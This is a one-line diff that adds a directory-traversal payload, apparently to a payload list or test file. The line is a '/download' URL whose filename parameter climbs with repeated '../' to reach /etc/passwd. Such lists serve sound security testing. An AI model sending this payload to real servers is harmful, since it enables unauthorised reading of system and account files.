@@ -1,0 +1,1 @@
+/download?type=files&filename=../../../../../../../../etc/passwd
